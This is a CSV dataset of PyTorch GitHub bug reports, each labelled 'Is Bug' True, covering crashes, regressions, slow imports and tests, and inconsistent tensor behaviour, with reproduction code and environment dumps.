Issue Title,Issue Body,Is Bug
torch dependencies aren't fully specified + pkg_resources import is slow triage review module: build triaged,"### üêõ Describe the bug

In pytorch/torch_version.py, we do `from pkg_resources import packaging`.

https://github.com/pytorch/pytorch/blob/83b45fe1666fd8ecc697078ca99ff46dabe0286b/torch/torch_version.py#L3

This causes two problems:
- We have an undeclared runtime dependency on setuptools. Currently pytorch only has declared dependencies on typing_extensions and dataclasses: https://github.com/pytorch/pytorch/blob/83b45fe1666fd8ecc697078ca99ff46dabe0286b/setup.py#L409
- pkg_resources is a really slow import. It takes a full 1s on my laptop, sometimes longer depending on disk cache. Moreover, we're not actually using pkg_resources itself, we're using pkg_resource's vendored version of https://github.com/pypa/packaging

Possible fixes:
- Declare a dependency on `packaging` and replace `from pkg_resources import packaging` with `import packaging.version`. This makes torch imports much faster! :-)
- Don't declare a dependency on `packaging`, but try to import it, and fallback to `from pkg_resources import packaging`. This doesn't fix the undeclared dependency, but it does make `import torch` faster.
Another variation on this is to try to steal vendored `packaging` from a package that imports faster, e.g. `pip._vendor.packaging.version`.  We could combine that with fallback to `pkg_resources` as well.
- Vendor the appropriate code from `packaging.version`

### Versions

1.10.1

cc @malfet @seemethere",True
Segfault using `torch.unique` on tensor with NaNs with `dim=0` on PyTorch 1.10 high priority module: crash triaged module: regression,"### üêõ Describe the bug

`torch.unique(torch.tensor([float(""nan"")]), dim=0)` yields a segfault on PyTorch 1.10 while working fine on 1.9.

### To reproduce the issue

```python
# segfaults in torch 1.10, works as expected in torch 1.9:
tensor_nan = torch.tensor([float(""nan"")])
assert torch.unique(tensor_nan, dim=0).numel() == 1
assert torch.isnan(torch.unique(tensor_nan, dim=0)[0])
```

### Additional comments

Note that when leaving `dim` to its default (`None`), the segfault does not occur, i.e.:
```python
# works as expected in both torch 1.10 and 1.9:
tensor_nan = torch.tensor([float(""nan"")])
assert torch.unique(tensor_nan, dim=None).numel() == 1
assert torch.isnan(torch.unique(tensor_nan, dim=None)[0])
```

The problem does not occur for `float(""inf"")`, i.e.:
```python
# works as expected in both torch 1.10 and 1.9:
tensor_inf = torch.tensor([float(""inf"")])
assert torch.unique(tensor_inf, dim=0).numel() == 1
assert torch.isinf(torch.unique(tensor_inf, dim=0)[0])
```

### Versions

```
PyTorch version: 1.10.1
Is debug build: False
CUDA used to build PyTorch: None
ROCM used to build PyTorch: N/A

OS: macOS 12.0.1 (x86_64)
GCC version: Could not collect
Clang version: 13.0.0 (clang-1300.0.29.30)
CMake version: Could not collect
Libc version: N/A

Python version: 3.8.12 | packaged by conda-forge | (default, Oct 12 2021, 21:50:56)  [Clang 11.1.0 ] (64-bit runtime)
Python platform: macOS-10.16-x86_64-i386-64bit
Is CUDA available: False
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] torch==1.10.1
[conda] torch                     1.10.1                   pypi_0    pypi
```

cc @ezyang @gchanan @zou3519 @bdhirsh",True
Noisy warning raised by 'default_collate' triaged module: data,"### üêõ Describe the bug

After upgrading pytorch version from 1.10.1 to the master branch (commit [d697bb4](https://github.com/pytorch/pytorch/commit/d697bb4220ff5ea8b46591cc082583bbf1a294a4)), `torch.utils.data._utils.collate.default_collate` raises the below noisy warning repeatedly:

```
UserWarning: An output with one or more elements was resized since it had shape [10], which does not
match the required output shape [2, 5].This behavior is deprecated, and in a future PyTorch release outputs will
not be resized unless they have zero elements. You can explicitly reuse an out tensor t by resizing it, inplace,
to zero elements with t.resize_(0).
```
The warning is original from [Resize.cpp](https://github.com/pytorch/pytorch/blob/master/aten/src/ATen/native/Resize.cpp#L11-L27) and triggered by [these lines](https://github.com/pytorch/pytorch/blob/master/torch/utils/data/_utils/collate.py#L130-L138) of `default_colloate`:

```
    elem = batch[0]
    elem_type = type(elem)
    if isinstance(elem, torch.Tensor):
        out = None
        if torch.utils.data.get_worker_info() is not None:
            # If we're in a background process, concatenate directly into a
            # shared memory tensor to avoid an extra copy
            numel = sum(x.numel() for x in batch)
            storage = elem.storage()._new_shared(numel)
            out = elem.new(storage)
        return torch.stack(batch, 0, out=out)
```

In case `default_collate` runs in background/worker process (torch.utils.data.get_worker_info() returns something), `out` is always a 1D tensor, but `batch` may has higher rank, thus a resize operation happens inside the `torch.stack` operation, which triggers the warning.

### Versions

Master branch (commit [d697bb4](https://github.com/pytorch/pytorch/commit/d697bb4220ff5ea8b46591cc082583bbf1a294a4))

# To Reproduce
Use this code snippet to reproduce the problem:

```
import torch

a, b = torch.randn([5]), torch.randn([5])
batch = [a, b]
elem = batch[0]

# In case torch.utils.data.get_worker_info() is not None
numel = sum(x.numel() for x in batch)
storage = elem.storage()._new_shared(numel)
out = elem.new(storage)

torch.stack(batch, 0, out=out)
```

# Expected behavior
No warning raises.

# Workaround

```
    elem = batch[0]
    elem_type = type(elem)
    if isinstance(elem, torch.Tensor):
        out = None
        if torch.utils.data.get_worker_info() is not None:
            # If we're in a background process, concatenate directly into a
            # shared memory tensor to avoid an extra copy
            numel = sum(x.numel() for x in batch)
            storage = elem.storage()._new_shared(numel)

            # reshape `out` before passing to torch.stack
            out = elem.new(storage).view(-1, *list(elem.size()))  

        return torch.stack(batch, 0, out=out)
```

Test code:

```
import torch

a, b = torch.randn([5]), torch.randn([5])
batch = [a, b]
elem = batch[0]

# In case torch.utils.data.get_worker_info() is not None
numel = sum(x.numel() for x in batch)
storage = elem.storage()._new_shared(numel)
out = elem.new(storage).view(-1, *list(elem.size()))

torch.stack(batch, 0, out=out)
```

cc @VitalyFedyunin @ejguan @NivekT",True
Get rid of the blocking call in RRefProxy oncall: distributed module: bootcamp triaged module: rpc,"RRefProxy (`rref.rpc_async`, `rref.rpc_sync`, `rref.remote`) currently uses a blocking RPC call to the owner 


https://github.com/pytorch/pytorch/blob/885a8e53bab50b1ac53e6c140cc0a9953e7e288e/torch/distributed/rpc/rref_proxy.py#L15-L19

https://github.com/pytorch/pytorch/blob/885a8e53bab50b1ac53e6c140cc0a9953e7e288e/torch/distributed/rpc/api.py#L409-L419

This violates the promise of `rpc_async` and `remote` being non-blocking. Instead, we should use the async call, and chain the remaining code in `_invoke_rpc` as a callback. 

cc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @osalpekar @jiayisuse @SciPioneer @H-Huang @jjlilley @mrzzd",True
channels_last significantly degrades accuracy high priority module: cuda triaged module: regression module: memory format,"## üêõ Bug

Moving a simple ResNet model and CIFAR images to channels_last format significantly degrades accuracy (by 6+%).

## To Reproduce

Steps to reproduce the behavior:

1. Download this script: https://gist.github.com/andrewilyas/ac844f3368c97e6d55e40209d2070557
2. Run ``python train.py 1`` and ``python train.py 2`` 
3. The only difference between the two runs is 3 lines that move the images and model to channels_last, but the difference in accuracy is significant (84% for channels_last and 91% for contiguous)

## Expected behavior

The two runs should produce identical results since the only difference between them is the memory format of the model and images.

## Environment

Output of collect_environment.py:

```
PyTorch version: 1.10.0+cu113
Is debug build: False
CUDA used to build PyTorch: 11.3
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.10.2
Libc version: glibc-2.27

Python version: 3.8.0 (default, Nov  6 2019, 21:49:08)  [GCC 7.3.0] (64-bit runtime)
Python platform: Linux-4.15.0-159-generic-x86_64-with-glibc2.10
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration:
GPU 0: A100-PCIE-40GB
GPU 1: A100-PCIE-40GB
GPU 2: A100-PCIE-40GB
GPU 3: A100-PCIE-40GB
GPU 4: A100-PCIE-40GB
GPU 5: A100-PCIE-40GB
GPU 6: A100-PCIE-40GB
GPU 7: A100-PCIE-40GB
GPU 8: A100-PCIE-40GB

Nvidia driver version: 460.91.03
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] msgpack-numpy==0.4.7.1
[pip3] mypy==0.812
[pip3] mypy-extensions==0.4.3
[pip3] numpy==1.20.3
[pip3] torch==1.10.0+cu113
[pip3] torchaudio==0.10.0+cu113
[pip3] torchmetrics==0.5.1
[pip3] torchvision==0.11.1+cu113
[conda] blas                      1.0                         mkl
[conda] cpuonly                   2.0                           0    pytorch
[conda] cudatoolkit               11.2.2               he111cf0_8    conda-forge
[conda] ffmpeg                    4.3                  hf484d3e_0    pytorch
[conda] mkl                       2021.3.0           h06a4308_520
[conda] mkl-service               2.4.0            py38h7f8727e_0
[conda] mkl_fft                   1.3.1            py38hd3c417c_0
[conda] mkl_random                1.2.2            py38h51133e4_0
[conda] numpy                     1.20.3                   pypi_0    pypi
[conda] pytorch-mutex             1.0                         cpu    pytorch
[conda] torch                     1.10.0+cu113             pypi_0    pypi
[conda] torchaudio                0.10.0+cu113             pypi_0    pypi
[conda] torchmetrics              0.5.1                    pypi_0    pypi
[conda] torchvision               0.11.1                   pypi_0    pypi
```


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @ngimel @VitalyFedyunin @jamesr66a",True
Error in icdf method of TransformedDistribution module: distributions triaged OSS contribution wanted,"## üêõ Bug

`TransformedDistribution.icdf` should perform validation _after_ applying the inverse transformation rather than before.

## To Reproduce

Running the following snippet
```python
from math import log
import torch

class TorchLogUniform(torch.distributions.TransformedDistribution):
    def __init__(self, lb, ub):
        super(TorchLogUniform, self).__init__(
            torch.distributions.Uniform(lb.log(), ub.log()),
            torch.distributions.ExpTransform(),
        )

lu = TorchLogUniform(torch.tensor(1e8), torch.tensor(1e10))
lu.icdf(torch.tensor(0.1))
```
...produces this error:
```python
...
~/.pyenv/versions/3.9.2/envs/lens-3.9.2/lib/python3.9/site-packages/torch/distributions/distribution.py in _validate_sample(self, value)
    275         assert support is not None
    276         if not support.check(value).all():
--> 277             raise ValueError('The value argument must be within the support')
    278 
    279     def _get_checked_instance(self, cls, _instance=None):

ValueError: The value argument must be within the support
```

## Expected behavior

`icdf` should work for inputs between zero and 1.

The fix is simple: [this validation check](https://github.com/pytorch/pytorch/blob/c371542efc31b1abfe6f388042aa3ab0cef935f2/torch/distributions/transformed_distribution.py#L184) should follow the `for` loop. I'd be happy to submit a PR.

cc @fritzo @neerajprad @alicanb @nikitaved",True
test_addr_type_promotion in test_linalg takes too long module: ci module: tests triaged,"test_addr_type_promotion generates tests for all possible dtype triplets (12^3 tests per each device). While cpu tests run quickly, each of ~1700 CUDA tests takes an appreciable amount of time, adding up to more than 2 minutes(compared to ~10 minutes for all of test_linalg). 
On my local run, all of test_linalg
```
----------------------------------------------------------------------
Ran 7545 tests in 590.081s

OK (skipped=1464)
```
filtered only test_addr_type_promotion:
```
----------------------------------------------------------------------
Ran 5184 tests in 157.534s

OK (skipped=728)
```

cc @seemethere @malfet @pytorch/pytorch-dev-infra @mruberry",True
Multiplication of scalar COO sparse tensors leads to internal assert failure module: sparse triaged module: assert failure,"## üêõ Bug

As in the title.

## To Reproduce

```python
>>> import torch
>>> t = torch.tensor(1).to_sparse()
>>> t
tensor(indices=tensor([], size=(0, 1)),
       values=tensor([1]),
       size=(), nnz=1, layout=torch.sparse_coo)
>>> t * t
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
RuntimeError: r.is_sparse()INTERNAL ASSERT FAILED at ""../aten/src/ATen/native/sparse/SparseTensorMath.cpp"":54, please report a bug to PyTorch. 
```

## Expected behavior

No internal assert failure.

In addition, the multiplication should succeed:
```python
>>> t * t
tensor(indices=tensor([], size=(0, 1)),
       values=tensor([1]),
       size=(), nnz=1, layout=torch.sparse_coo)
```

## Environment

- PyTorch Version (e.g., 1.0): 1.10.0a0

## Additional context

Notice that the addition of scalar COO tensors works correctly
```python
>>> t + t
tensor(indices=tensor([], size=(0, 1)),
       values=tensor([2]),
       size=(), nnz=1, layout=torch.sparse_coo)
```


cc @nikitaved @pearu @cpuhrsch @IvanYashchuk",True
tensor_split does not handle non-contiguous indices high priority triaged module: memory format,"## üêõ Bug

torch.tensor_split does not produce the same outputs for non-contiguous tensors as for contiguous, see repro below.

## To Reproduce

Steps to reproduce the bug:

```python
inner_indices = torch.tensor([[564,   0],
        [564,   0],
        [564,   0],
        [564,   1],
        [565,   1],
        [566,   0],
        [566,   0],
        [566,   0],
        [566,   0],
        [566,   0],
        [566,   0],
        [566,   1],
        [567,   0],
        [567,   0],
        [567,   0],
        [567,   0],
        [567,   0],
        [567,   1],
        [568,   0],
        [568,   0],
        [568,   0],
        [568,   1],
        [569,   0],
        [569,   0],
        [569,   0],
        [569,   1],
        [570,   0],
        [570,   0],
        [570,   0],
        [570,   0],
        [570,   0]])
data = torch.tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32)
for u, v in zip(torch.tensor_split(data, inner_indices[:, 1]),
                torch.tensor_split(data, inner_indices[:, 1].contiguous())):
    if u.shape != v.shape:
        print(u, v)
```

Output:
```
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([4], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([4], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([4], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([4], dtype=torch.int32)
tensor([4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([4], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
```

## Expected behavior

Output should be the same for contiguous and non-contiguous tensors.

## Environment

Tested in stable 1.9 and nightly '1.10.0.dev20210814+cpu'.

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @VitalyFedyunin @jamesr66a @ppwwyyxx",True
BatchNorm2d + SyncBatchNorm incorrect multi gpu behaviour in 1.10.0 (tested working in 1.8.0) module: nn triaged,"## üêõ Bug

SyncBatchNorm layers in torch 1.10.0 give different outputs on 2 gpus vs the equivalent BatchNorm layer on a single gpu. This wasn't a problem in torch 1.8.0

## To Reproduce
This code is based on the [PyTorch DDP demo](https://pytorch.org/tutorials/intermediate/ddp_tutorial.html) but the model consists only of a `BatchNorm2d` layer.

```python
import os
import torch
import torch.distributed as dist
import torch.nn as nn
import torch.multiprocessing as mp

from torch.nn.parallel import DistributedDataParallel as DDP
import argparse


def setup(rank, world_size):
    torch.manual_seed(0)
    os.environ[""MASTER_ADDR""] = ""localhost""
    os.environ[""MASTER_PORT""] = ""12355""

    # iniialize the process group
    dist.init_process_group(""gloo"", rank=rank, world_size=world_size)


def cleanup():
    dist.destroy_process_group()


class ToyModel(nn.Module):
    def __init__(self, num_features=10):
        super().__init__()
        self.bn = nn.BatchNorm2d(num_features=num_features)

    def forward(self, x):
        x = x.permute(0, 2, 1, 3)
        x = self.bn(x)
        x = x.permute(0, 2, 1, 3)
        return x


def demo_basic(rank, world_size, convert_sync_batchnorm):
    print(f""Running basic DDP example on rank {rank}."")
    setup(rank, world_size)

    # create model and move it to GPU with id rank
    model = ToyModel(num_features=10)
    # create model and move it to GPU with id rank
    if world_size > 1 and convert_sync_batchnorm:
        print(""Converting BatchNorm to SyncBatchNorm"")
        model = torch.nn.SyncBatchNorm.convert_sync_batchnorm(model)

    model = model.to(rank)
    if world_size > 1:
        ddp_model = DDP(model, device_ids=[rank])
        model = ddp_model

    inputs = torch.randn(2, 2, 10, 1).to(rank)
    print(f""{rank=}, {inputs[0, 0].squeeze()=}"")
    outputs = model(inputs)
    print(f""{rank=}, {outputs[0, 0].squeeze()=}"")

    cleanup()


def run_demo(demo_fn, world_size, convert_bn):
    if world_size > 1:
        mp.spawn(demo_fn, args=(world_size, convert_bn), nprocs=world_size, join=True)
    else:
        demo_fn(0, world_size, convert_bn)


if __name__ == ""__main__"":
    parser = argparse.ArgumentParser()
    parser.add_argument(""--n_gpus"", default=2, type=int, help=""Number of gpus"")
    parser.add_argument(
        ""--convert_bn"",
        action=""store_true"",
        default=False,
        help=""Whether to convert BatchNorm layers to SyncBatchNorm"",
    )

    args = parser.parse_args()

    print(f""{torch.__version__=}"")
    run_demo(demo_basic, args.n_gpus, args.convert_bn)
```

### Torch 1.10.0a0+git63955b3

#### 1 - 2 gpus, convert to `SyncBatchNorm`
```
python3 ddp_demo.py --n_gpus 2 --convert_bn
torch.__version__='1.10.0a0+git63955b3'
Running basic DDP example on rank 0.
Running basic DDP example on rank 1.
Converting BatchNorm to SyncBatchNorm
Converting BatchNorm to SyncBatchNorm
rank=1, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:1')
rank=0, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:0')
rank=1, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7058,  0.7740,  0.1321,  0.6478,  0.2026, -0.1025,  1.0656,
        -1.3900,  0.9416], device='cuda:1', grad_fn=<SqueezeBackward0>)
rank=0, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7058,  0.7740,  0.1321,  0.6478,  0.2026, -0.1025,  1.0656,
        -1.3900,  0.9416], device='cuda:0', grad_fn=<SqueezeBackward0>)
```

#### 2 - 2 gpus, do not convert to `SyncBatchNorm`
```
python3 ddp_demo.py --n_gpus 2
torch.__version__='1.10.0a0+git63955b3'
Running basic DDP example on rank 0.
Running basic DDP example on rank 1.
rank=1, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:1')
rank=0, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:0')
rank=1, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7582, -0.7058, -1.2356,  0.7740,  1.4852,  0.1321, -1.1821,
         0.6478, -1.1941], device='cuda:1', grad_fn=<SqueezeBackward0>)
rank=0, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7582, -0.7058, -1.2356,  0.7740,  1.4852,  0.1321, -1.1821,
         0.6478, -1.1941], device='cuda:0', grad_fn=<SqueezeBackward0>)
```

#### 3 - 1 gpu
```
python3 ddp_demo.py --n_gpus 1
torch.__version__='1.10.0a0+git63955b3'
Running basic DDP example on rank 0.
False
rank=0, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:0')
rank=0, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7582, -0.7058, -1.2356,  0.7740,  1.4852,  0.1321, -1.1821,
         0.6478, -1.1941], device='cuda:0', grad_fn=<SqueezeBackward0>)
```

1 != 2 ‚ùå
2 == 3 ‚úÖ

### Torch 1.8.0a0+618cf40

#### 1 - 2 gpus, convert to `SyncBatchNorm`
```
python3 ddp_demo.py --n_gpus 2 --convert_bn
torch.__version__='1.8.0a0+618cf40'
Running basic DDP example on rank 0.
Running basic DDP example on rank 1.
Converting BatchNorm to SyncBatchNorm
Converting BatchNorm to SyncBatchNorm
rank=1, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:1')
rank=0, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:0')
rank=0, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7582, -0.7058, -1.2356,  0.7740,  1.4852,  0.1321, -1.1821,
         0.6478, -1.1941], device='cuda:0', grad_fn=<SqueezeBackward0>)
rank=1, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7582, -0.7058, -1.2356,  0.7740,  1.4852,  0.1321, -1.1821,
         0.6478, -1.1941], device='cuda:1', grad_fn=<SqueezeBackward0>)
```

#### 2 - 2 gpus, do not convert to `SyncBatchNorm`
```
python3 ddp_demo.py --n_gpus 2
torch.__version__='1.8.0a0+618cf40'
Running basic DDP example on rank 0.
Running basic DDP example on rank 1.
rank=0, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:0')
rank=1, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:1')
rank=1, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7582, -0.7058, -1.2356,  0.7740,  1.4852,  0.1321, -1.1821,
         0.6478, -1.1941], device='cuda:1', grad_fn=<SqueezeBackward0>)
rank=0, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7582, -0.7058, -1.2356,  0.7740,  1.4852,  0.1321, -1.1821,
         0.6478, -1.1941], device='cuda:0', grad_fn=<SqueezeBackward0>)
```

#### 3 - 1 gpu
```
python3 ddp_demo.py --n_gpus 1
torch.__version__='1.8.0a0+618cf40'
Running basic DDP example on rank 0.
rank=0, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:0')
rank=0, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7582, -0.7058, -1.2356,  0.7740,  1.4852,  0.1321, -1.1821,
         0.6478, -1.1941], device='cuda:0', grad_fn=<SqueezeBackward0>)
```

1 == 2 == 3 ‚úÖ

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

I expect the behaviour in torch 1.10.0 to mirror that in 1.8.0 where options 1, 2 and 3 all produce the same output.

## Environment

Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

### Torch 1.10.0a0+git63955b3 Env info
```bash
Collecting environment information...
PyTorch version: 1.10.0a0+git63955b3
Is debug build: False
CUDA used to build PyTorch: 11.2
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.21.1
Libc version: glibc-2.27

Python version: 3.8.11 (default, Jul  3 2021, 17:53:42)  [GCC 7.5.0] (64-bit runtime)
Python platform: Linux-5.4.0-65-generic-x86_64-with-glibc2.27
Is CUDA available: False
CUDA runtime version: 11.2.152
GPU models and configuration: Could not collect
Nvidia driver version: Could not collect
cuDNN version: Probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_adv_infer.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_adv_train.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_infer.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_train.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_ops_infer.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_ops_train.so.8.1.1
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.21.1
[pip3] pytorch-memlab==0.2.3
[pip3] torch==1.10.0a0+git63955b3
[pip3] torch-tb-profiler==0.2.1
[pip3] torchaudio==0.9.0a0-jit-kaldi-fa498ad
[pip3] torchpq==0.1.8.3
[pip3] torchsummary==1.5.1
[pip3] torchvision==0.10.0

```

### Torch 1.8.0a0+618cf40 Env info
```bash
Collecting environment information...
PyTorch version: 1.8.0a0+618cf40
Is debug build: False
CUDA used to build PyTorch: 11.2
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.21.1
Libc version: glibc-2.27

Python version: 3.8.11 (default, Jul  3 2021, 17:53:42)  [GCC 7.5.0] (64-bit runtime)
Python platform: Linux-5.4.0-65-generic-x86_64-with-glibc2.27
Is CUDA available: False
CUDA runtime version: 11.2.152
GPU models and configuration: Could not collect
Nvidia driver version: Could not collect
cuDNN version: Probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_adv_infer.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_adv_train.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_infer.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_train.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_ops_infer.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_ops_train.so.8.1.1
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.21.1
[pip3] pytorch-memlab==0.2.3
[pip3] torch==1.8.0a0+618cf40
[pip3] torchaudio==0.9.0a0-jit-kaldi-fa498ad
[pip3] torchpq==0.1.8.3
[pip3] torchsummary==1.5.1
[pip3] torchvision==0.10.0
[conda] Could not collect
``` 


cc @albanD @mruberry @jbschlosser",True
AttributeError: module 'torch' has no attribute 'unique_dim' high priority triaged module: ux,"## üêõ Bug

When using `from torch import *`, the error `AttributeError: module 'torch' has no attribute 'unique_dim'` appears.

## To Reproduce

Steps to reproduce the behavior:
1. install pytorch 1.9.0
2. from torch import *

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

<!-- A clear and concise description of what you expected to happen. -->

## Environment

Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

PyTorch version: 1.9.0
Is debug build: False
CUDA used to build PyTorch: 11.1
ROCM used to build PyTorch: N/A

OS: Microsoft Windows 10 Pro
GCC version: (MinGW.org GCC-6.3.0-1) 6.3.0
Clang version: Could not collect
CMake version: Could not collect
Libc version: N/A

Python version: 3.7.6 (default, Jan  8 2020, 20:23:39) [MSC v.1916 64 bit (AMD64)] (64-bit runtime)
Python platform: Windows-10-10.0.19041-SP0
Is CUDA available: True
CUDA runtime version: 11.1.105
GPU models and configuration: GPU 0: GeForce GTX 1060 6GB
Nvidia driver version: 461.40
cuDNN version: C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v11.1\bin\cudnn_ops_train64_8.dll
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.21.1
[pip3] numpydoc==1.1.0
[pip3] pytorch-lightning==0.5.2.1
[pip3] torch==1.9.0+cu111
[pip3] torchaudio==0.9.0
[pip3] torchvision==0.10.0+cu111
[conda] blas                      1.0                         mkl    defaults
[conda] cudatoolkit               11.1.1               heb2d755_7    conda-forge
[conda] mkl                       2020.2                      256    defaults
[conda] mkl-service               2.3.0            py37h196d8e1_0    defaults
[conda] mkl_fft                   1.3.0            py37h46781fe_0    defaults
[conda] mkl_random                1.1.1            py37h47e9c7a_0    defaults
[conda] numpy                     1.21.1                   pypi_0    pypi
[conda] numpy-base                1.18.5           py37hc3f5095_0    defaults
[conda] numpydoc                  1.1.0              pyhd3eb1b0_1    defaults
[conda] pytorch                   1.9.0           py3.7_cuda11.1_cudnn8_0    pytorch
[conda] pytorch-lightning         0.5.2.1                  pypi_0    pypi
[conda] torch                     1.2.0                    pypi_0    pypi
[conda] torchaudio                0.9.0                    pypi_0    pypi
[conda] torchvision               0.10.0+cu111             pypi_0    pypi


## Additional context

<!-- Add any other context about the problem here. -->


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411",True
torch.unique_consecutive() is very slow when dim is specified even with 1-d tensors module: performance triaged module: sorting and selection,"## Issue description

torch.unique_consecutive(dim=0) is very slow with 1-d tensors (and also with 2-d tensors). Please see the following. 

## Code example

torch.manual_seed(0)
t = torch.randint(500, (10000000, ))
t = torch.sort(t)[0]

start = time.time()
uniques, counts = torch.unique_consecutive(t, dim=0, return_counts=True)
end = time.time()
print(""torch.unique_consecutive(dim=0) time:"", end - start)

start = time.time()
uniques, counts = torch.unique_consecutive(t, return_counts=True)
end = time.time()
print(""torch.unique_consecutive() time:"", end - start)

## Code output

torch.unique_consecutive(dim=0) time: 27.382863759994507
